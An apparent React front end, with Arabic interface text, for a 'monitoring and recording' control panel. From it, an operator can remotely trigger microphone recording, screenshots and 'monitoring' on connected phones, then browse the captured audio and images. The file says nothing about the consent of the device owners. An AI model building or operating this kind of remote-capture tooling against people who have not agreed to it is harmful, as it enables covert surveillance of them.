import React, { useState, useEffect } from 'react';
import './App.css';

const API_BASE_URL = window.location.origin;

function App() {
  const [activeTab, setActiveTab] = useState('dashboard');
  const [devices, setDevices] = useState([]);
  const [audioRecordings, setAudioRecordings] = useState([]);
  const [screenshots, setScreenshots] = useState([]);
  const [statistics, setStatistics] = useState({});
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');

  // جلب البيانات من الخادم
  const fetchData = async () => {
    setLoading(true);
    setError('');
    
    try {
      // جلب الأجهزة
      const devicesResponse = await fetch(`${API_BASE_URL}/api/devices`);
      const devicesData = await devicesResponse.json();
      
      if (devicesData.success) {
        setDevices(devicesData.devices);
      }

      // جلب التسجيلات الصوتية
      const audioResponse = await fetch(`${API_BASE_URL}/api/audio`);
      const audioData = await audioResponse.json();
      
      if (audioData.success) {
        setAudioRecordings(audioData.recordings);
      }

      // جلب لقطات الشاشة
      const screenshotsResponse = await fetch(`${API_BASE_URL}/api/screenshots`);
      const screenshotsData = await screenshotsResponse.json();
      
      if (screenshotsData.success) {
        setScreenshots(screenshotsData.screenshots);
      }

      // جلب الإحصائيات
      const statsResponse = await fetch(`${API_BASE_URL}/api/statistics`);
      const statsData = await statsResponse.json();
      
      if (statsData.success) {
        setStatistics(statsData.statistics);
      }

    } catch (err) {
      setError('فشل في جلب البيانات من الخادم');
      console.error('Error fetching data:', err);
    } finally {
      setLoading(false);
    }
  };

  // جلب البيانات عند تحميل المكون
  useEffect(() => {
    fetchData();
    
    // تحديث البيانات كل 30 ثانية
    const interval = setInterval(fetchData, 30000);
    return () => clearInterval(interval);
  }, []);

  // التحكم في الأجهزة
  const handleDeviceAction = async (deviceId, action) => {
    setLoading(true);
    
    try {
      const response = await fetch(`${API_BASE_URL}/api/devices/${deviceId}/${action}`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        }
      });
      
      const data = await response.json();
      
      if (data.success) {
        alert(`تم ${action} بنجاح للجهاز ${deviceId}`);
        fetchData(); // تحديث البيانات
      } else {
        alert(`فشل في ${action}: ${data.error}`);
      }
    } catch (err) {
      alert(`خطأ في ${action}: ${err.message}`);
    } finally {
      setLoading(false);
    }
  };

  // حذف جهاز
  const handleDeleteDevice = async (deviceId) => {
    if (!confirm('هل أنت متأكد من حذف هذا الجهاز؟')) {
      return;
    }
    
    setLoading(true);
    
    try {
      const response = await fetch(`${API_BASE_URL}/api/devices/${deviceId}`, {
        method: 'DELETE'
      });
      
      const data = await response.json();
      
      if (data.success) {
        alert('تم حذف الجهاز بنجاح');
        fetchData(); // تحديث البيانات
      } else {
        alert(`فشل في حذف الجهاز: ${data.error}`);
      }
    } catch (err) {
      alert(`خطأ في حذف الجهاز: ${err.message}`);
    } finally {
      setLoading(false);
    }
  };

  // تحويل حجم الملف
  const formatFileSize = (bytes) => {
    if (bytes === 0) return '0 Bytes';
    const k = 1024;
    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
  };

  // تحويل المدة
  const formatDuration = (seconds) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
  };

  // عرض لوحة المعلومات
  const renderDashboard = () => (
    <div className="dashboard">
      <div className="stats-grid">
        <div className="stat-card">
          <div className="stat-icon">📱</div>
          <div className="stat-content">
            <h3>الأجهزة المتصلة</h3>
            <div className="stat-number">{statistics.active_devices || 0}</div>
            <p>من أصل {devices.length} أجهزة</p>
          </div>
        </div>
        
        <div className="stat-card">
          <div className="stat-icon">🎵</div>
          <div className="stat-content">
            <h3>التسجيلات الصوتية</h3>
            <div className="stat-number">{statistics.audio_recordings || 0}</div>
            <p>ملف صوتي</p>
          </div>
        </div>
        
        <div className="stat-card">
          <div className="stat-icon">📸</div>
          <div className="stat-content">
            <h3>لقطات الشاشة</h3>
            <div className="stat-number">{statistics.screenshots || 0}</div>
            <p>صورة</p>
          </div>
        </div>
        
        <div className="stat-card">
          <div className="stat-icon">💾</div>
          <div className="stat-content">
            <h3>التخزين المستخدم</h3>
            <div className="stat-number">{statistics.total_storage_mb || 0} MB</div>
            <p>من أصل 10 GB</p>
            <div className="progress-bar">
              <div 
                className="progress-fill" 
                style={{width: `${((statistics.total_storage_mb || 0) / 10240) * 100}%`}}
              ></div>
            </div>
          </div>
        </div>
      </div>

      <div className="devices-section">
        <h2>الأجهزة النشطة</h2>
        <p>قائمة بالأجهزة المتصلة حالياً</p>
        
        <div className="devices-list">
          {devices.map(device => (
            <div key={device.device_id} className="device-item">
              <div className="device-status ${device.is_active ? 'online' : 'offline'}"></div>
              <div className="device-info">
                <h4>{device.device_name}</h4>
                <p>{device.device_type} • البطارية: {device.battery_level}%</p>
                <small>آخر نشاط: {new Date(device.last_seen).toLocaleString('ar-SA')}</small>
              </div>
              <div className="device-actions">
                <button 
                  className="btn-control"
                  onClick={() => handleDeviceAction(device.device_id, 'start_recording')}
                  disabled={loading}
                >
                  تسجيل
                </button>
                <button 
                  className="btn-control secondary"
                  onClick={() => handleDeviceAction(device.device_id, 'take_screenshot')}
                  disabled={loading}
                >
                  تصوير
                </button>
                <button 
                  className="btn-control success"
                  onClick={() => handleDeviceAction(device.device_id, 'start_monitoring')}
                  disabled={loading}
                >
                  مراقبة
                </button>
              </div>
            </div>
          ))}
        </div>
      </div>
    </div>
  );

  // عرض الأجهزة
  const renderDevices = () => (
    <div className="devices-management">
      <div className="section-header">
        <h2>إدارة الأجهزة</h2>
        <p>تحكم في الأجهزة المتصلة وتحديثاتها</p>
        <button className="btn-refresh" onClick={fetchData} disabled={loading}>
          {loading ? '⏳ جاري التحديث...' : '🔄 تحديث'}
        </button>
      </div>

      <div className="devices-grid">
        {devices.map(device => (
          <div key={device.device_id} className="device-card">
            <div className="device-header">
              <div className="device-status ${device.is_active ? 'online' : 'offline'}"></div>
              <h3>{device.device_name}</h3>
              <span className="device-id">{device.device_id}</span>
            </div>
            
            <div className="device-details">
              <p><strong>النوع:</strong> {device.device_type}</p>
              <p><strong>إصدار النظام:</strong> {device.os_version}</p>
              <p><strong>البطارية:</strong> {device.battery_level}%</p>
              <p><strong>آخر نشاط:</strong> {new Date(device.last_seen).toLocaleString('ar-SA')}</p>
            </div>

            <div className="device-controls">
              <div className="control-row">
                <button 
                  className="btn-action start"
                  onClick={() => handleDeviceAction(device.device_id, 'start_recording')}
                  disabled={loading}
                >
                  🎵 بدء التسجيل
                </button>
                <button 
                  className="btn-action stop"
                  onClick={() => handleDeviceAction(device.device_id, 'stop_recording')}
                  disabled={loading}
                >
                  ⏹️ إيقاف التسجيل
                </button>
              </div>
              
              <div className="control-row">
                <button 
                  className="btn-action start"
                  onClick={() => handleDeviceAction(device.device_id, 'take_screenshot')}
                  disabled={loading}
                >
                  📸 التقاط الشاشة
                </button>
                <button 
                  className="btn-action secondary"
                  onClick={() => alert('إعدادات الجهاز')}
                >
                  ⚙️ إعدادات
                </button>
              </div>
              
              <div className="control-row">
                <button 
                  className="btn-action start"
                  onClick={() => handleDeviceAction(device.device_id, 'start_monitoring')}
                  disabled={loading}
                >
                  👁️ بدء المراقبة
                </button>
                <button 
                  className="btn-action danger"
                  onClick={() => handleDeleteDevice(device.device_id)}
                  disabled={loading}
                >
                  🗑️ حذف
                </button>
              </div>
            </div>
          </div>
        ))}
      </div>
    </div>
  );

  // عرض الملفات
  const renderFiles = () => (
    <div className="files-management">
      <div className="section-header">
        <h2>إدارة الملفات</h2>
        <p>عرض وإدارة الملفات الصوتية ولقطات الشاشة</p>
      </div>

      <div className="files-tabs">
        <button 
          className={`tab-btn ${activeTab === 'audio' ? 'active' : ''}`}
          onClick={() => setActiveTab('audio')}
        >
          🎵 الملفات الصوتية ({audioRecordings.length})
        </button>
        <button 
          className={`tab-btn ${activeTab === 'screenshots' ? 'active' : ''}`}
          onClick={() => setActiveTab('screenshots')}
        >
          📸 لقطات الشاشة ({screenshots.length})
        </button>
      </div>

      {activeTab === 'audio' && (
        <div className="files-grid">
          {audioRecordings.map(recording => (
            <div key={recording.id} className="file-card">
              <div className="file-icon">🎵</div>
              <div className="file-info">
                <h4>{recording.filename}</h4>
                <p><strong>الجهاز:</strong> {recording.device_name}</p>
                <p><strong>الحجم:</strong> {formatFileSize(recording.file_size)}</p>
                <p><strong>المدة:</strong> {formatDuration(recording.duration)}</p>
                <p><strong>التاريخ:</strong> {new Date(recording.created_at).toLocaleString('ar-SA')}</p>
              </div>
              <div className="file-actions">
                <button className="btn-file play">▶️ تشغيل</button>
                <button className="btn-file download">⬇️ تحميل</button>
                <button className="btn-file delete">🗑️ حذف</button>
              </div>
            </div>
          ))}
        </div>
      )}

      {activeTab === 'screenshots' && (
        <div className="files-grid">
          {screenshots.map(screenshot => (
            <div key={screenshot.id} className="file-card">
              <div className="file-icon">📸</div>
              <div className="file-info">
                <h4>{screenshot.filename}</h4>
                <p><strong>الجهاز:</strong> {screenshot.device_name}</p>
                <p><strong>الحجم:</strong> {formatFileSize(screenshot.file_size)}</p>
                <p><strong>الأبعاد:</strong> {screenshot.width}x{screenshot.height}</p>
                <p><strong>التاريخ:</strong> {new Date(screenshot.created_at).toLocaleString('ar-SA')}</p>
              </div>
              <div className="file-actions">
                <button className="btn-file view">👁️ عرض</button>
                <button className="btn-file download">⬇️ تحميل</button>
                <button className="btn-file delete">🗑️ حذف</button>
              </div>
            </div>
          ))}
        </div>
      )}
    </div>
  );

  // عرض التقارير
  const renderReports = () => (
    <div className="reports">
      <div className="section-header">
        <h2>التقارير والإحصائيات</h2>
        <p>تقارير مفصلة عن نشاط الأجهزة والخدمات</p>
      </div>

      <div className="reports-grid">
        <div className="report-card">
          <h3>نشاط الأجهزة اليومي</h3>
          <div className="chart-placeholder">
            📊 رسم بياني لنشاط الأجهزة
          </div>
        </div>

        <div className="report-card">
          <h3>توزيع الخدمات</h3>
          <div className="service-stats">
            <div className="service-item">
              <span>🎵 التسجيل الصوتي</span>
              <div className="progress-bar">
                <div className="progress-fill" style={{width: '67%'}}></div>
              </div>
              <span>67%</span>
            </div>
            <div className="service-item">
              <span>📸 النشاط الشاشة</span>
              <div className="progress-bar">
                <div className="progress-fill" style={{width: '45%'}}></div>
              </div>
              <span>45%</span>
            </div>
            <div className="service-item">
              <span>👁️ المراقبة</span>
              <div className="progress-bar">
                <div className="progress-fill" style={{width: '78%'}}></div>
              </div>
              <span>78%</span>
            </div>
          </div>
        </div>
      </div>
    </div>
  );

  return (
    <div className="App">
      <header className="app-header">
        <div className="header-content">
          <div className="logo">
            <span className="logo-icon">⚡</span>
            <h1>لوحة التحكم - تطبيق المراقبة والتسجيل</h1>
          </div>
          <button className="settings-btn">⚙️ الإعدادات</button>
        </div>
      </header>

      <nav className="app-nav">
        <button 
          className={`nav-btn ${activeTab === 'dashboard' ? 'active' : ''}`}
          onClick={() => setActiveTab('dashboard')}
        >
          📊 لوحة المعلومات
        </button>
        <button 
          className={`nav-btn ${activeTab === 'devices' ? 'active' : ''}`}
          onClick={() => setActiveTab('devices')}
        >
          📱 الأجهزة
        </button>
        <button 
          className={`nav-btn ${activeTab === 'files' ? 'active' : ''}`}
          onClick={() => setActiveTab('files')}
        >
          📁 الملفات
        </button>
        <button 
          className={`nav-btn ${activeTab === 'reports' ? 'active' : ''}`}
          onClick={() => setActiveTab('reports')}
        >
          📈 التقارير
        </button>
      </nav>

      <main className="app-main">
        {error && (
          <div className="error-message">
            ⚠️ {error}
            <button onClick={fetchData}>إعادة المحاولة</button>
          </div>
        )}
        
        {loading && <div className="loading">⏳ جاري تحميل البيانات...</div>}
        
        {activeTab === 'dashboard' && renderDashboard()}
        {activeTab === 'devices' && renderDevices()}
        {activeTab === 'files' && renderFiles()}
        {activeTab === 'reports' && renderReports()}
      </main>
    </div>
  );
}

export default App;


